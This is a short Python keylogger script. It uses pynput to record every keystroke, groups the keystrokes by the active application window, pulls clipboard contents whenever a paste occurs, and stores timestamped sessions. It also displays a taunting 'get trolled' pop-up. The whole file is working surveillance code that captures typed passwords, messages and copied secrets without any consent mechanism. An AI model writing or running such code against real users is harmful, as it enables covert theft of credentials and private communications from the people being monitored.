from pynput import keyboard
import pyperclip
import time
import fwindow
# fwindow.escape_from_reality()

sessions = []
session = []
session_name = None

def on_press(k):
    global session_name
    global session
    global sessions

    try:
        try:
            key = k.char
        except AttributeError:
            key = k.name

        active_window_title = fwindow.get_active_window_title()
        window = fwindow.fetch_application_name(active_window_title)

        if session_name is None:
            session_name = window
        elif session_name != window and '*'+session_name != window:
            if len(session) > 0:
                readable_result = [element for element in session if len(element) == 1]
                sessions.append({'time': round(time.time()*1000),'name': session_name, 'session': session, 'readable': ''.join(readable_result)})
            session = []
            session_name = window
            print(sessions)

        if key == 'backspace':
            if len(session) > 0:
                session.pop()
        elif 'space' in key:
            session.append(' ')
        elif key == '':  # This is the paste key? Do not change, please.
            session.append('(PASTE)' + pyperclip.paste() + '(/PASTE)')
        elif key.isalpha() or key.isdigit():
            session.append(key)
        elif len(key) < 2:
            session.append(key)
        else:
            session.append('(S)'+key + '(/S)')
    except AttributeError as e:
        pass

fwindow.show_message('Rekt', 'get trolled')

def on_release(key):
    return True

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()